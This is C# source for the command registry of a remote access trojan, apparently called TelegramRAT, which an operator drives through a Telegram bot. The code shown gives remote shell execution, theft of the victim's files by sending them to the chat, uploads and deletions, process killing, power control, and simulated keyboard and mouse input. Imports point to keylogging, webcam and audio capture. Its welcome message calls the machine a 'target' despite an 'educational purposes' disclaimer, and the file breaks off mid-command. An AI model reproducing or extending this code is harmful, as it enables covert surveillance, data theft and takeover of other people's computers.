using Microsoft.Scripting.Hosting;
using Telegram.Bot.Types.Enums;
using AForge.Video.DirectShow;
using System.Drawing.Imaging;
using TelegramRAT.Utilities;
using TelegramRAT.Features;
using IronPython.Hosting;
using System.Diagnostics;
using Telegram.Bot.Types;
using Telegram.Bot.Types.InputFiles;
using System.Drawing;
using Telegram.Bot;
using WindowsInput;
using NAudio.Wave;
using System.Text;
using System.Net;
using System.IO;
using System.Collections.Generic;
using System.Linq;

namespace TelegramRAT.Commands;

public static class CommandRegistry
{
    public static readonly ScriptEngine PythonEngine = Python.CreateEngine();
    public static ScriptScope PythonScope = PythonEngine.CreateScope();
    private static bool KeylogActive = false;
    private static Func<List<uint>> KeylogKeyProvider = Keylogger.GetPressingKeys;
    private static Func<uint, char> KeylogKeyMapper = WinAPI.MapVirtualKey;
    internal static Func<ProcessStartInfo, Process?> ProcessStarter { get; set; } = info => Process.Start(info);
    internal static Func<string?, string?, IntPtr> WindowFinder { get; set; } = WinAPI.FindWindow;
    internal static Func<IntPtr> ForegroundWindowGetter { get; set; } = WinAPI.GetForegroundWindow;
    internal static Func<IntPtr, bool> WindowValidator { get; set; } = WinAPI.IsWindow;
    internal static Func<IntPtr, Rectangle> WindowBoundsGetter { get; set; } = WinAPI.GetWindowBounds;
    internal static Func<IntPtr, string> WindowTitleGetter { get; set; } = WinAPI.GetWindowTitle;
    internal static Func<IntPtr, IntPtr> ProcessHandleFromWindow { get; set; } = WinAPI.GetProcessHandleFromWindow;
    internal static Func<IntPtr, int> ProcessIdGetter { get; set; } = WinAPI.GetProcessId;
    internal static Action<IntPtr, Stream> WindowCapture { get; set; } = Utils.CaptureWindow;

    private static void StartProcess(string fileName, string arguments)
    {
        var startInfo = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            CreateNoWindow = true
        };

        ProcessStarter(startInfo);
    }

    public static void InitializeCommands(ICollection<BotCommand> commandsList)
    {
        commandsList.Clear();
        CoreCommands(commandsList);
        SystemCommands(commandsList);
        FileCommands(commandsList);
        RemoteControlCommands(commandsList);
        MonitoringCommands(commandsList);
        ScriptingCommands(commandsList);
        MiscellaneousCommands(commandsList);
    }

    private static void CoreCommands(ICollection<BotCommand> commandsList)
    {
        commandsList.Add(new BotCommand
        {
            Command = "start",
            ArgsCount = 0,
            Description = "Initialize the bot and display welcome message.",
            Example = "/start",
            Execute = async model =>
            {
                var botCommands = new List<Telegram.Bot.Types.BotCommand>
                {
                    new() { Command = "screenshot", Description = " 🖼 Capture screen" },
                    new() { Command = "webcam", Description = "📷 Capture webcam" },
                    new() { Command = "message", Description = "✉️ Send message" },
                    new() { Command = "cd", Description = "🗃 Change directory" },
                    new() { Command = "dir", Description = "🗂 Current directory content" },
                    new() { Command = "help", Description = "ℹ️ See description of command" },
                    new() { Command = "commands", Description = "📃 List of all commands" }
                };
                var welcomeMessage = "Welcome, since you see this message, you've done everything well. Now you will receive a message every time your target starts. I kindly remind you, that this software was written in educational purposes only, don't use it for bothering or trolling people pls.\nUse /help and /command to learn this bot functionality";
                await Program.Bot.SendMessage(
                    model.Message.Chat.Id,
                welcomeMessage,
                    replyParameters: new ReplyParameters { MessageId = model.Message.MessageId }
                );
                await Program.Bot.SetMyCommands(botCommands);
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "help",
            Description = "Show description of other commands.",
            Example = "/help screenshot",
            ArgsCount = -1,
            Execute = async model =>
            {
                if (!model.Args.Any())
                {
                    var helpText = "Use this command to retrieve description of other commands, like this: /help screenshot\nTo get list of all commands - type /commands";
                    await Program.Bot.SendMessage(
                        model.Message.Chat.Id,
                        helpText,
                        replyParameters: new ReplyParameters { MessageId = model.Message.MessageId }
                    );
                    return;
                }

                var command = commandsList.FirstOrDefault(c => c.Command.Equals(model.Args[0], StringComparison.OrdinalIgnoreCase) ||
                                                          (c.Aliases?.Contains(model.Args[0], StringComparer.OrdinalIgnoreCase) == true));

                if (command == null)
                {
                    await Program.Bot.SendMessage(
                        model.Message.Chat.Id,
                        "This command doesn't exist! To get list of all commands - type /commands",
                        replyParameters: new ReplyParameters { MessageId = model.Message.MessageId }
                    );
                    return;
                }

                var description = new StringBuilder($"<b>/{command.Command.ToUpper()}</b>\n");
                if (command.Aliases?.Any() == true)
                    description.AppendLine($"Aliases: {string.Join(", ", command.Aliases)}\n");
                description.AppendLine($"{command.Description ?? "<i>No description provided</i>"}");
                if (!string.IsNullOrEmpty(command.Example))
                    description.AppendLine($"Example: {command.Example}");

                await Program.Bot.SendMessage(
                    model.Message.Chat.Id,
                    description.ToString(),
                    ParseMode.Html,
                    replyParameters: new ReplyParameters { MessageId = model.Message.MessageId }
                );
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "cmd",
            Description = "Run cmd commands.",
            Example = "/cmd dir",
            ArgsCount = -2,
            Execute = async model =>
            {
                try
                {
                    var process = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = "/c " + model.RawArgs,
                            CreateNoWindow = true,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false
                        }
                    };
                    process.Start();
                    await Program.SendSuccessAsync(model.Message, "Command execution started.");
                    await process.WaitForExitAsync();

                    var output = await process.StandardOutput.ReadToEndAsync();
                    var error = await process.StandardError.ReadToEndAsync();
                    var combinedOutput = string.IsNullOrWhiteSpace(output) ? error : output;
                    combinedOutput = new string(combinedOutput.Take(4096).ToArray());

                    if (string.IsNullOrWhiteSpace(combinedOutput))
                        await Program.SendSuccessAsync(model.Message, "Command executed successfully with no output.");
                    else
                        await Program.SendSuccessAsync(model.Message, $"Command executed successfully.\n\nOutput:\n{combinedOutput}");
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "ping",
            Description = "Ping bot to check if it's work",
            ArgsCount = 0,
            Execute = async model =>
            {
                var pingMessage = await Program.Bot.SendMessage(model.Message.Chat.Id, "Ping!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                var elapsedTime = (DateTime.UtcNow - model.Message.Date.ToUniversalTime()).TotalMilliseconds;
                await Program.Bot.SendMessage(model.Message.Chat.Id, $"Elapsed time: {elapsedTime} ms", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
            }
        });
    }

    private static void SystemCommands(ICollection<BotCommand> commandsList)
    {
        commandsList.Add(new BotCommand
        {
            Command = "processes",
            Aliases = new[] { "prcss" },
            ArgsCount = 0,
            Description = "Get list of running processes.",
            Example = "/processes",
            Execute = async model =>
            {
                try
                {
                    StringBuilder processesList = new StringBuilder();
                    processesList.AppendLine("List of processes: ");
                    int i = 1;
                    Process[] processCollection = Process.GetProcesses();

                    foreach (Process p in processCollection)
                    {
                        processesList.AppendLine($"<code>{WebUtility.HtmlEncode(p.ProcessName)}</code> : <code>{p.Id}</code>");
                        if (i % 50 == 0)
                        {
                            await Program.Bot.SendMessage(
                                model.Message.Chat.Id,
                                processesList.ToString(),
                                parseMode: ParseMode.Html,
                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId }
                            );
                            processesList.Clear();
                        }
                        i++;
                    }
                    if (processesList.Length > 0)
                    {
                        await Program.Bot.SendMessage(
                            model.Message.Chat.Id,
                            processesList.ToString(),
                            parseMode: ParseMode.Html,
                            replyParameters: new ReplyParameters { MessageId = model.Message.MessageId }
                        );
                    }
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "processkill",
            ArgsCount = -2,
            Description = "Kill process or processes by name or id.",
            Example = "/processkill id:1234",
            Execute = async model =>
            {
                try
                {
                    if (model.Args[0].StartsWith("id:", StringComparison.OrdinalIgnoreCase))
                    {
                        string procStr = model.Args[0][3..].Trim();
                        if (!string.IsNullOrEmpty(procStr) && int.TryParse(procStr, out int procId))
                        {
                            Process.GetProcessById(procId).Kill();
                            await Program.SendSuccessAsync(model.Message, "Process killed successfully.");
                        }
                        else
                        {
                            await Program.SendErrorAsync(model.Message, new ArgumentException("Invalid process ID."));
                        }
                        return;
                    }

                    if (model.Args[0].StartsWith("name:", StringComparison.OrdinalIgnoreCase))
                    {
                        string procStr = model.Args[0][5..].Trim();
                        var processes = Process.GetProcessesByName(procStr);
                        if (processes.Length == 0)
                        {
                            await Program.SendErrorAsync(model.Message, new ArgumentException("No running processes with that name."));
                            return;
                        }
                        foreach (var proc in processes)
                        {
                            proc.Kill();
                        }
                        await Program.SendSuccessAsync(model.Message, "Processes killed successfully.");
                        return;
                    }

                    var defaultProcesses = Process.GetProcessesByName(model.RawArgs);
                    if (defaultProcesses.Length == 0)
                    {
                        await Program.SendErrorAsync(model.Message, new ArgumentException("No running processes with that name."));
                        return;
                    }
                    foreach (var proc in defaultProcesses)
                    {
                        proc.Kill();
                    }
                    await Program.SendSuccessAsync(model.Message, "Processes killed successfully.");
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "power",
            ArgsCount = 1,
            Description = "Switch PC power state. Usage:\n\n" +
            "Off - Turn PC off\n" +
            "Restart - Restart PC\n" +
            "LogOff - Log off system",
            Example = "/power logoff",
            Execute = async model =>
            {
                try
                {
                    switch (model.Args[0].ToLower())
                    {
                        case "off":
                            await Program.Bot.SendMessage(
                                model.Message.Chat.Id,
                                "Done!",
                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            StartProcess("powershell.exe", "/c shutdown /s /t 1");
                            break;

                        case "restart":
                            await Program.Bot.SendMessage(
                                model.Message.Chat.Id,
                                "Done!",
                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            StartProcess("powershell.exe", "/c shutdown /r /t 1");
                            break;

                        case "logoff":
                            await Program.Bot.SendMessage(
                                model.Message.Chat.Id,
                                "Done!",
                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            StartProcess("cmd.exe", "/c shutdown /l");
                            break;

                        default:
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "Wrong usage, type /help power to get info about this command!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            break;
                    }

                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "monitor",
            ArgsCount = 1,

            Description = "Turn monitor off or on",
            Example = "/monitor off",
            Execute = async model =>
            {
                try
                {
                    switch (model.Args[0])
                    {
                        case "off":
                            bool status = WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MONITORPOWER, 2);
                            await Program.Bot.SendMessage(model.Message.Chat.Id, status ? "Monitor turned off" : "Failed", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            break;

                        case "on":
                            new MouseSimulator(new InputSimulator()).MoveMouseBy(0, 0);
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "Monitor turned on", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            break;

                        default:
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "Type off or on. See help - /help monitor", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            break;
                    }

                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "drives",
            ArgsCount = 0,
            Description = "Show all logical drives on this computer.",
            Example = "/drives",
            Execute = async model =>
            {
                try
                {
                    DriveInfo[] drives = DriveInfo.GetDrives();
                    StringBuilder drivesStr = new StringBuilder();
                    foreach (DriveInfo drive in drives)
                    {
                        drivesStr.AppendLine($"Name: {drive.Name}");
                        if (drive.IsReady)
                        {
                            drivesStr.AppendLine(
                            $"Label: <b>{drive.VolumeLabel}</b>\n" +
                            $"Type: {drive.DriveType}\n" +
                            $"Format: {drive.DriveFormat}\n" +
                            $"Avaliable Space: {string.Format("{0:F1}", drive.TotalFreeSpace / 1024 / 1024 / (float)1024)}/" +
                            $"{drive.TotalSize / 1024 / 1024 / 1024}GB");
                        }
                        else
                        {
                            drivesStr.AppendLine("<i>Drive is not ready, data is unavaliable</i>");
                        }
                        drivesStr.AppendLine();
                    }
                    await Program.Bot.SendMessage(model.Message.Chat.Id, string.Join(string.Empty, drivesStr.ToString().Take(4096).ToArray()), ParseMode.Html, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });
    }

    private static void FileCommands(ICollection<BotCommand> commandsList)
    {
        commandsList.Add(new BotCommand
        {
            Command = "dir",
            Description = "Get all files and folders from specified directory. If no path is provided, shows current directory.",
            Example = "/dir C:\\Program Files",
            ArgsCount = -1,
            Execute = async model =>
            {
                try
                {
                    string curdir = model.Args.Length > 0 ? model.RawArgs : Directory.GetCurrentDirectory();

                    if (!Directory.Exists(curdir))
                    {
                        await Program.SendErrorAsync(model.Message, new DirectoryNotFoundException($"The directory \"{curdir}\" does not exist."));
                        return;
                    }

                    var files = Directory.EnumerateFiles(curdir);
                    var dirs = Directory.EnumerateDirectories(curdir);

                    var response = new StringBuilder();

                    if (files.Any())
                    {
                        response.AppendLine("<b>Files:</b>\n");
                        foreach (var file in files)
                        {
                            response.AppendLine($"<code>{Path.GetFileName(file)}</code>");
                            if (response.Length > 4000)
                            {
                                await Program.Bot.SendMessage(model.Message.Chat.Id, response.ToString(), parseMode: ParseMode.Html);
                                response.Clear();
                            }
                        }
                        response.AppendLine();
                    }

                    if (dirs.Any())
                    {
                        response.AppendLine("<b>Folders:</b>\n");
                        foreach (var dir in dirs)
                        {
                            response.AppendLine($"<code>{Path.GetFileName(dir)}</code>");
                            if (response.Length > 4000)
                            {
                                await Program.Bot.SendMessage(model.Message.Chat.Id, response.ToString(), parseMode: ParseMode.Html);
                                response.Clear();
                            }
                        }
                    }

                    if (response.Length > 0)
                        await Program.Bot.SendMessage(model.Message.Chat.Id, response.ToString(), parseMode: ParseMode.Html);
                    else
                        await Program.SendInfoAsync(model.Message, "This directory contains no files and no folders.");
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "cd",
            Description = "Change current directory.",
            Example = "/cd C:\\Users",
            Execute = async model =>
            {
                try
                {
                    var targetDirectoryInput = model.Args.Length > 0
                        ? string.Join(' ', model.Args)
                        : model.RawArgs;

                    targetDirectoryInput = targetDirectoryInput?.Trim() ?? string.Empty;

                    if (targetDirectoryInput.Length >= 2)
                    {
                        if ((targetDirectoryInput.StartsWith("\"") && targetDirectoryInput.EndsWith("\"")) ||
                            (targetDirectoryInput.StartsWith("'") && targetDirectoryInput.EndsWith("'")))
                        {
                            targetDirectoryInput = targetDirectoryInput[1..^1];
                        }
                    }

                    if (string.IsNullOrWhiteSpace(targetDirectoryInput))
                    {
                        await Program.SendErrorAsync(model.Message, new DirectoryNotFoundException("The specified directory does not exist."));
                        return;
                    }

                    var targetDirectory = Path.GetFullPath(targetDirectoryInput);

                    if (Directory.Exists(targetDirectory))
                    {
                        Directory.SetCurrentDirectory(targetDirectory);
                        await Program.SendSuccessAsync(model.Message, $"Directory changed to: <code>{Directory.GetCurrentDirectory()}</code>");
                    }
                    else
                    {
                        await Program.SendErrorAsync(model.Message, new DirectoryNotFoundException("The specified directory does not exist."));
                    }
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "curdir",
            Description = "Show current directory.",
            Example = "/curdir",
            ArgsCount = 0,
            Execute = async model =>
            {
                try
                {
                    await Program.Bot.SendMessage(model.Message.Chat.Id, $"Current directory:\n<code>{Directory.GetCurrentDirectory()}</code>", parseMode: ParseMode.Html, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "download",
            Description = "Send file from PC by path",
            Example = "/download hello.txt",
            Execute = async model =>
            {
                try
                {
                    string filePath = model.RawArgs;
                    var baseDirectory = Directory.GetCurrentDirectory();
                    var normalizedPath = Path.IsPathRooted(filePath)
                        ? Path.GetFullPath(filePath)
                        : Path.GetFullPath(Path.Combine(baseDirectory, filePath));

                    if (!File.Exists(normalizedPath))
                    {
                        await Program.Bot.SendMessage(model.Message.Chat.Id, $"There is no file \"{filePath}\" at path {normalizedPath}");
                        return;
                    }
                    using FileStream fileStream = new FileStream(normalizedPath, FileMode.Open, FileAccess.Read, FileShare.Read);
                    {
                        await Program.Bot.SendDocument(model.Message.Chat.Id, new InputFileStream(fileStream, Path.GetFileName(fileStream.Name)), caption: filePath, replyParameters: null);
                    }
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "upload",
            Description = "Upload image or file to current directory.",
            Execute = async model =>
            {
                try
                {
                    if (model.Files.Length == 0)
                    {
                        await Program.Bot.SendMessage(model.Message.Chat.Id, "No file or images provided.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        return;
                    }
                    foreach (var file in model.Files)
                    {
                        using FileStream fileStream = new FileStream(model.Filename ?? file.FileUniqueId + ".jpg", FileMode.Create);
                        {
                            var telegramFile = await Program.Bot.GetFile(file.FileId);
                            await Program.Bot.DownloadFile(telegramFile.FilePath, fileStream);
                        }
                    }
                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "delete",
            Aliases = new[] { "del" },
            Description = "Delete file in path",
            Example = "/delete hello world.txt",
            ArgsCount = -2,
            Execute = async model =>
            {
                try
                {
                    if (File.Exists(model.RawArgs))
                    {
                        File.Delete(model.RawArgs);
                        await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    }
                    else
                    {
                        await Program.Bot.SendMessage(model.Message.Chat.Id, "This file does not exist.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    }
                }
                catch (Exception e)
                {
                    await Program.ReportExceptionAsync(model.Message, e);
                }

            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "mkdir",
            Aliases = new[] { "md", "createfolder", "makedir", "createdir" },
            Description = "Create directory.",
            Example = "/mkdir C:\\Users\\User\\Documents\\NewFolder",
            ArgsCount = -2,
            Execute = async model =>
            {

                try
                {
                    if (!Directory.Exists(model.RawArgs))
                    {
                        Directory.CreateDirectory(model.RawArgs);
                        await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    }
                    else
                    {
                        await Program.Bot.SendMessage(model.Message.Chat.Id, "This folder already exists!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    }
                }
                catch (Exception e)
                {
                    await Program.ReportExceptionAsync(model.Message, e);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "rmdir",
            Description = "Remove directory.",
            Example = "/rmdir C:\\Users\\User\\Desktop\\My Folder",
            ArgsCount = -2,
            Execute = async model =>
            {
                try
                {
                    if (Directory.Exists(model.RawArgs))
                    {
                        Directory.Delete(model.RawArgs);
                    }
                    else
                    {
                        await Program.Bot.SendMessage(model.Message.Chat.Id, "This folder does not exist!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    }
                }
                catch (Exception e)
                {
                    await Program.ReportExceptionAsync(model.Message, e);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "rename",
            Aliases = new[] { "ren" },
            ArgsCount = 2,
            Description = "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.",
            Example = "/rename \"C:\\Users\\User\\Documents\\Old Name.txt\" \"New Name.txt\"",
            Execute = async model =>
            {
                try
                {
                    if (File.Exists(model.Args[0]) && !File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
                    {
                        string filePath = Path.GetFullPath(model.Args[0]);
                        string newFileName = $"{Path.GetDirectoryName(filePath)}\\{model.Args[1]}";
                        File.Move(filePath, newFileName);
                        await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    }
                    else
                    {
                        if (!File.Exists(model.Args[0]))
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "This file does not exist!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        if (File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "There is a file with the same name!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    }
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "copyfile",
            ArgsCount = 2,
            Description = "Copy file. First argument is file path (full or realtive), second is folder path. Type paths as in cmd.",
            Example = "/copyfile \"My folder\\hello world.txt\" \"C:\\Users\\User\\Documents\\Some Folder\"",
            Execute = async model =>
            {
                try
                {
                    if (File.Exists(model.Args[0]) && Directory.Exists(model.Args[1]))
                    {
                        File.Copy(model.Args[0], Path.Combine(model.Args[1], Path.GetFileName(model.Args[0])));
                    }
                    else
                    {
                        if (!File.Exists(model.Args[0]))
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "This file does not exist!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        if (!Directory.Exists(model.Args[1]))
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "This path does not exist!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    }
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });
    }

    private static void RemoteControlCommands(ICollection<BotCommand> commandsList)
    {
        commandsList.Add(new BotCommand
        {
            Command = "input",
            Description =
            "Simulate keyboard input with virtual keycode, expressed in hexadecimal\n\n" +
            "List of virtual keycodes:\n" +
            "LBUTTON = 1\nRBUTTON = 2\nCANCEL = 3\nMIDBUTTON = 4\nBACKSPACE = 8\n" +
            "TAB = 9\nCLEAR = C\nENTER = D\nSHIFT = 10\nCTRL = 11\nALT = 12\n" +
            "PAUSE = 13\nCAPSLOCK = 14\nESC = 1B\nSPACE = 20\nPAGEUP = 21\nPAGEDOWN = 22\n" +
            "END = 23\nHOME = 24\nLEFT = 25\nUP = 26\nRIGHT = 27\nDOWN = 28\n\n0..9 = 30..39\n" +
            "A..Z = 41..5a\nF1..F24 = 70..87\n\n" +

            "<a href=\"https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\">See all keycodes</a>\n\n" +
            "To send combination of keys, join them with plus: 11+43 (ctrl+c)\n",
            ArgsCount = -2,
            Example = "/input 48 45 4c 4c 4f (hello)",
            Execute = async model =>
            {
                await Task.Run(async () =>
                {
                    try
                    {
                        KeyboardSimulator keyboardSimulator = new KeyboardSimulator(new InputSimulator());
                        foreach (string arg in model.Args)
                        {
                            if (arg.Contains('+'))
                            {
                                List<int> modifiedKeys = new List<int>();
                                foreach (string vk in arg.Split('+'))
                                {
                                    modifiedKeys.Add(int.Parse(vk, System.Globalization.NumberStyles.HexNumber));
                                }
                                keyboardSimulator.ModifiedKeyStroke(new int[] { modifiedKeys[0] }, modifiedKeys.Skip(1));
                            }
                            else
                            {
                                keyboardSimulator.KeyPress(int.Parse(arg, System.Globalization.NumberStyles.HexNumber));
                            }
                        }
                        await Program.Bot.SendMessage(model.Message.Chat.Id, "Sended!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    }
                    catch (Exception ex)
                    {
                        await Program.ReportExceptionAsync(model.Message, ex);
                    }
                });
            },
        });

        commandsList.Add(new BotCommand
        {
            Command = "mouse",

            Description =
            "This command has multiple usage.\n" +
            "info - show info about cursor\n" +
            "to - move mouse cursor to point on the primary screen\n" +
            "by - move mouse by pixels\n" +
            "click - click mouse button\n" +
            "dclick - double click mouse button\n" +
            "down - mouse button down\n" +
            "up - mouse button up\n" +
            "scroll | vscroll - vertical scroll\n" +
            "hscroll - horizontal scroll",

            ArgsCount = -2,

            Example = "/mouse to 200 300",

            Execute = async model =>
            {
                MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());

                try
                {
                    switch (model.Args[0].ToLower())
                    {
                        case "i":
                        case "info":
                            string mouseInfo;
                            Point cursorPosition = new Point();
                            if (WinAPI.GetCursorPos(out cursorPosition))
                            {
                                mouseInfo =
                                $"Cursor position: x:{cursorPosition.X} y:{cursorPosition.Y}";
                            }
                            else
                            {
                                mouseInfo = "Unable to get info about cursor";
                            }
                            await Program.Bot.SendMessage(model.Message.Chat.Id, mouseInfo, ParseMode.Html, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            return;

                        case "to":
                            mouseSimulator.MoveMouseTo(Convert.ToDouble(model.Args[1]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Width),
                            Convert.ToDouble(model.Args[2]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Height));
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            break;

                        case "by":
                            mouseSimulator.MoveMouseBy(Convert.ToInt32(model.Args[1]),
                            Convert.ToInt32(model.Args[2]));
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            break;

                        case "clk":
                        case "clck":
                        case "click":
                            if (model.Args.Length > 1)
                            {
                                switch (model.Args[1])
                                {
                                    case "r":
                                    case "right":
                                        mouseSimulator.RightButtonClick();
                                        break;
                                    case "l":
                                    case "left":
                                        mouseSimulator.LeftButtonClick();
                                        break;
                                    default:
                                        await Program.Bot.SendMessage(model.Message.Chat.Id, "Type whether button you want to click(right or left).", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                        return;
                                }
                            }
                            else
                            {
                                await Program.Bot.SendMessage(model.Message.Chat.Id, "Type whether button you want to click(right or left).", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            }
                            break;

                        case "dclk":
                        case "dclck":
                        case "dclick":
                            if (model.Args.Length > 1)
                            {
                                switch (model.Args[1])
                                {
                                    case "r":
                                    case "right":
                                        mouseSimulator.RightButtonDoubleClick();
                                        break;
                                    case "l":
                                    case "left":
                                        mouseSimulator.LeftButtonDoubleClick();
                                        break;
                                    default:
                                        await Program.Bot.SendMessage(model.Message.Chat.Id, "Type whether button you want to double click(right or left).", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                        return;
                                }
                            }
                            else
                            {
                                await Program.Bot.SendMessage(model.Message.Chat.Id, "Type whether button you want to double click(right or left).", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            }
                            break;

                        case "dn":
                        case "dwn":
                        case "down":
                            if (model.Args.Length > 1)
                            {
                                switch (model.Args[1])
                                {
                                    case "r":
                                    case "right":
                                        mouseSimulator.RightButtonDown();
                                        break;
                                    case "l":
                                    case "left":
                                        mouseSimulator.LeftButtonDown();
                                        break;
                                    default:
                                        await Program.Bot.SendMessage(model.Message.Chat.Id, "Type whether button you want to set down(right or left).", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                        return;
                                }
                            }
                            else
                            {
                                mouseSimulator.RightButtonDown();
                            }
                            break;

                        case "up":
                            if (model.Args.Length > 1)
                            {
                                switch (model.Args[1])
                                {
                                    case "r":
                                    case "right":
                                        mouseSimulator.RightButtonUp();
                                        break;
                                    case "l":
                                    case "left":
                                        mouseSimulator.LeftButtonUp();
                                        break;
                                    default:
                                        await Program.Bot.SendMessage(model.Message.Chat.Id, "Type whether button you want to set up(right or left).", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                        return;
                                }
                            }
                            else
                            {
                                mouseSimulator.LeftButtonUp();
                                mouseSimulator.RightButtonUp();
                            }
                            break;

                        case "vscr":
                        case "vscroll":
                        case "scroll":
                        case "scr":
                            if (model.Args.Length > 1)
                            {
                                if (int.TryParse(model.Args[1], out int vscrollSteps))
                                {
                                    mouseSimulator.VerticalScroll(vscrollSteps * -1);
                                }
                                else
                                {
                                    await Program.Bot.SendMessage(model.Message.Chat.Id, "The number must be an integer.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                    return;
                                }
                            }
                            else
                            {
                                await Program.Bot.SendMessage(model.Message.Chat.Id, "Type scroll steps you want to simulate.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            }
                            break;

                        case "hscr":
                        case "hscroll":
                            if (model.Args.Length > 1)
                            {
                                if (int.TryParse(model.Args[1], out int hscrollSteps))
                                {
                                    mouseSimulator.HorizontalScroll(hscrollSteps * -1);
                                }
                                else
                                {
                                    await Program.Bot.SendMessage(model.Message.Chat.Id, "The number must be an integer.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                    return;
                                }
                            }
                            else
                            {
                                await Program.Bot.SendMessage(model.Message.Chat.Id, "Type scroll steps you want to simulate.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            }
                            break;

                        default:
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "No such use for this command.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            return;
                    }
                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Done", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });

                }
